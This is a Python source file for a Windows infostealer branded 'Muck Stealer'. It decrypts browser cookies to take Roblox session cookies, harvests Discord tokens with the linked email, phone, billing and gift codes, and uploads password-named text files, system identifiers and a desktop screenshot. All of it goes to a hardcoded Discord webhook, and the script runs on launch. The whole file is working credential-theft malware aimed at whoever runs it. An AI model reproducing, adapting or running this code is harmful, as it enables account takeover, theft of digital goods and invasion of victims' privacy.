import os, requests, re, base64, json, platform, wmi, subprocess, uuid, threading, traceback, random, shutil, sqlite3, ctypes
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from tempfile import mkdtemp
from concurrent.futures import ThreadPoolExecutor, as_completed
import ctypes.wintypes as wintypes

__WEBHOOK__ = "https://discord.com/api/webhooks/1274730774977056860/gMRRiMHCweuy5pduJLESHMow86IZCDzwTORdaZh9xyGxixcvY0J6BWY6RRnn7yFD1iiY"
webhook = __WEBHOOK__
__PING__ = "%ping_enabled%"
__PINGTYPE__ = "%ping_type%"
__ERROR__ = "%_error_enabled%"
__STARTUP__ = "%_startup_enabled%"
__DEFENDER__ = "%_defender_enabled%"
tempfolder = mkdtemp()

forceRead = False
debug = False
def safe(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception:
            if debug:
                traceback.print_exc()
    return wrapper

class CookieLogger:

    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    def __init__(self):
        browsers = self.findBrowsers()

        self.embeds = [{
            "username": "Prepare Messager",
            "title": "Victim Found!",
            "description" : f"You can find the Cookies in the embeds.\nUse a VPN to connect to the area to log in.",
            "color": 12422241,
        }]

        threads = [threading.Thread(target=self.getCookie, args=(browser[0], browser[1])) for browser in browsers]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
    
        if len(self.embeds) == 1:
            print("No roblox cookies")
        else:
            embedsSplit = [self.embeds[idx:idx+10] for idx in range(len(self.embeds)) if idx % 10 == 0]
            for embeds in embedsSplit:
                data = {"embeds": embeds}
                requests.post(webhook, json=data)
        
    @safe
    def handleEmbed(self, roblosec):

        if not roblosec:
            return

        basicInfo = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": roblosec}).json()
        username = basicInfo["UserName"]
        userId = basicInfo["UserID"]
        robux = basicInfo["RobuxBalance"]
        premium = basicInfo["IsPremium"]

        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
        creationDate = advancedInfo["created"]
        creationDate = creationDate.split("T")[0]
        creationDate = creationDate.split("-")
        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"

        embed = {
            "username": "Muck Cookie Stealer",
            "title": "Cookie Found!",
            "description" : f"Log in with the Cookie Below. You may need to use a VPN to connect to the Area shown in the Previous Embed.",
            "color": 12422241,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "User ID", "value": userId, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Has Premium", "value": premium, "inline": True},
                {"name": "Creation Date", "value": creationDate, "inline": True},
                {"name": "Cookie", "value": f"```{roblosec}```", "inline": False}

            ]
        }

        self.embeds.append(embed)

    @safe
    def findBrowsers(self):
        found = []

        for root in [self.appdata, self.localappdata]:
            for directory in os.listdir(root):
                try:
                    for _root, _, _ in os.walk(os.path.join(root, directory)):
                        for file in os.listdir(_root):
                            if file == "Local State":
                                if "Default" in os.listdir(_root):
                                    found.append([_root, True])
                                elif "Login Data" in os.listdir(_root):
                                    found.append([_root, False])
                                else:
                                    pass
                except Exception:
                    pass

        return found

    @safe
    def getMasterKey(self, browserPath):
        with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
            localState = json.loads(f.read())
        
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        truncatedMasterKey = masterKey[5:]

        return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

    @safe
    def decryptCookie(self, cookie, masterKey):
        iv = cookie[3:15]
        encryptedValue = cookie[15:]

        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
        decryptedValue = cipher.decrypt(encryptedValue)

        return decryptedValue[:-16].decode()

    @safe
    def getCookie(self, browserPath, isProfiled):

        cookiesFound = []

        profiles = ["Default"]
        try:
            masterKey = self.getMasterKey(browserPath)
        except Exception:
            return cookiesFound

        if isProfiled:
            for directory in os.listdir(browserPath):
                if directory.startswith("Profile "):
                    profiles.append(directory)
        
        if not isProfiled:
            if "Network" in os.listdir(browserPath):
                cookiePath = os.path.join(browserPath, "Network", "Cookies")
            else:
                cookiePath = os.path.join(browserPath, "Cookies")

            filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(256)]) + '.db' # Random name so there aren't collisions
            
            shutil.copy2(cookiePath, filename)
            connection = sqlite3.connect(filename)
            cursor = connection.cursor()

            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for cookie in cursor.fetchall():
                if cookie[0].endswith("roblox.com") and cookie[2]:
                    decrypted = self.decryptCookie(cookie[2], masterKey)
                    try:
                        if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
                            cookiesFound.append(decrypted)
                    except Exception:
                        pass

            connection.close()
            os.remove(filename)
        
        else:
            for profile in profiles:
                if "Network" in os.listdir(os.path.join(browserPath, profile)):
                    cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                else:
                    cookiePath = os.path.join(browserPath, profile, "Cookies")

                filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(20)]) + '.db' # Random name so there aren't collisions

                try:
                    shutil.copy2(cookiePath, filename)
                except PermissionError:
                    if forceRead:
                        pidlist = cookiePath
                        for pid in pidlist:
                            subprocess.check_output(f"taskkill /f /pid {pid}", creationflags=0x08000000, shell=True)
                    else:
                        return
                    
                    shutil.copy2(cookiePath, filename)
                        
                connection = sqlite3.connect(filename)
                cursor = connection.cursor()

                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for cookie in cursor.fetchall():
                    if cookie[0].endswith("roblox.com") and cookie[2]:
                        decrypted = self.decryptCookie(cookie[2], masterKey)
                        try:
                            if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
                                cookiesFound.append(decrypted)
                        except Exception:
                            pass
                
                connection.close()
                os.remove(filename)

        for cookie in cookiesFound:
            self.handleEmbed(cookie)

    # Thanks to https://stackoverflow.com/questions/39570207/what-process-is-using-a-given-file
    # For this massive chunk of code below. I didn't feel like working with Ctypes myself, so
    # I pasted this.

    @safe
    def whichProcessesUsingFile(self, path: str) -> list:
        # -----------------------------------------------------------------------------
        # generic strings and constants
        # -----------------------------------------------------------------------------

        ntdll = ctypes.WinDLL('ntdll')
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        NTSTATUS = wintypes.LONG

        INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
        FILE_READ_ATTRIBUTES = 0x80
        FILE_SHARE_READ = 1
        OPEN_EXISTING = 3
        FILE_FLAG_BACKUP_SEMANTICS = 0x02000000

        FILE_INFORMATION_CLASS = wintypes.ULONG
        FileProcessIdsUsingFileInformation = 47

        LPSECURITY_ATTRIBUTES = wintypes.LPVOID
        ULONG_PTR = wintypes.WPARAM


        # -----------------------------------------------------------------------------
        # create handle on concerned file with dwDesiredAccess == FILE_READ_ATTRIBUTES
        # -----------------------------------------------------------------------------

        kernel32.CreateFileW.restype = wintypes.HANDLE
        kernel32.CreateFileW.argtypes = (
            wintypes.LPCWSTR,      # In     lpFileName
            wintypes.DWORD,        # In     dwDesiredAccess
            wintypes.DWORD,        # In     dwShareMode
            LPSECURITY_ATTRIBUTES,  # In_opt lpSecurityAttributes
            wintypes.DWORD,        # In     dwCreationDisposition
            wintypes.DWORD,        # In     dwFlagsAndAttributes
            wintypes.HANDLE)       # In_opt hTemplateFile
        hFile = kernel32.CreateFileW(
            path, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, None, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS, None)
        if hFile == INVALID_HANDLE_VALUE:
            raise ctypes.WinError(ctypes.get_last_error())


        # -----------------------------------------------------------------------------
        # prepare data types for system call
        # -----------------------------------------------------------------------------

        class IO_STATUS_BLOCK(ctypes.Structure):
            class _STATUS(ctypes.Union):
                _fields_ = (('Status', NTSTATUS),
                            ('Pointer', wintypes.LPVOID))
            _anonymous_ = '_Status',
            _fields_ = (('_Status', _STATUS),
                        ('Information', ULONG_PTR))


        iosb = IO_STATUS_BLOCK()


        class FILE_PROCESS_IDS_USING_FILE_INFORMATION(ctypes.Structure):
            _fields_ = (('NumberOfProcessIdsInList', wintypes.LARGE_INTEGER),
                        ('ProcessIdList', wintypes.LARGE_INTEGER * 64))


        info = FILE_PROCESS_IDS_USING_FILE_INFORMATION()

        PIO_STATUS_BLOCK = ctypes.POINTER(IO_STATUS_BLOCK)
        ntdll.NtQueryInformationFile.restype = NTSTATUS
        ntdll.NtQueryInformationFile.argtypes = (
            wintypes.HANDLE,        # In  FileHandle
            PIO_STATUS_BLOCK,       # Out IoStatusBlock
            wintypes.LPVOID,        # Out FileInformation
            wintypes.ULONG,         # In  Length
            FILE_INFORMATION_CLASS)  # In  FileInformationClass

        # -----------------------------------------------------------------------------
        # system call to retrieve list of PIDs currently using the file
        # -----------------------------------------------------------------------------
        status = ntdll.NtQueryInformationFile(hFile, ctypes.byref(iosb),
                                            ctypes.byref(info),
                                            ctypes.sizeof(info),
                                            FileProcessIdsUsingFileInformation)
        pidList = info.ProcessIdList[0:info.NumberOfProcessIdsInList]
        return pidList
    
def send_file(webhook, file_path, file_name):
    try:
        # Open the file in binary mode and send it via webhook
        with open(file_path, 'rb') as f:
            webhook.send(file=File(f, file_name))
    except OSError as e:
        print(f"Error sending file {file_path}: {e}")

def search_files():
    matched_files = set()  # Use a set to avoid duplicates
    webhook = SyncWebhook.from_url(__WEBHOOK__, session=requests.Session())
    tasks = []

    # Thread pool to send files concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        for root, dirs, files in os.walk("C:\\"):
            for filez in files:
                if "password" in filez.lower() and filez.lower().endswith('.txt'):
                    file_path = os.path.join(root, filez)
                    
                    # Check if the file has already been sent
                    if file_path not in matched_files:
                        matched_files.add(file_path)
                        print(file_path)
                        tasks.append(executor.submit(send_file, webhook, file_path, filez))

        # Wait for all tasks to complete
        for task in as_completed(tasks):
            task.result()

class PcInfo:
    def __init__(self):
        self.get_inf(__WEBHOOK__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Muck Stealer", color=5639644)

        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        embed.add_field(
            name="System Info",
            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="Muck Grabber | Created By Muck")

        webhook.send(embed=embed, username="Muck Token Stealer")

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__WEBHOOK__)
        

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key



    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in self.ids:
                                            self.tokens.append(token)
                                            self.ids.append(uid)
                                except Exception:
                                    pass

                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = ""

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            if user['mfa_enabled']:
                mfa = "✅"
            else:
                mfa = "❌"

            if user['premium_type'] == 0:
                nitro = "❌"
            elif user['premium_type'] == 1:
                nitro = '`Nitro Classic`'
            elif user['premium_type'] == 2:
                nitro = '`Nitro`'
            elif user['premium_type'] == 3:
                nitro = '`Nitro Basic`'
            else:
                nitro = "❌"

            if payment == []:
                methods = "❌"
            else:
                methods = ""
                for method in payment:
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 2:
                        methods += "<:>"
                    else:
                        methods += "❓"

            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'

            if "code" in gift.text:
                codes = json.loads(gift.text)
                for code in codes:
                    val_codes.append((code['code'], code['promotion']['outbound_title']))

            if val_codes == []:
                val += f'\n:gift: `No Gift Cards Found`\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
                    

            embed = Embed(title=username, color=5639644)
            embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
            embed.set_footer(text="Muck Grabber | Created By Muck")
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                username="Muck Token Stealer")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Desktop Screenshot", color=5639644)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")
        embed.set_footer(text="Muck Grabber | Created By muck")

        webhook.send(
            embed=embed2,
            file=file,
            username="Muck Token Stealer")
        
def main():
    CookieLogger()
    PcInfo()
    Discord()

main()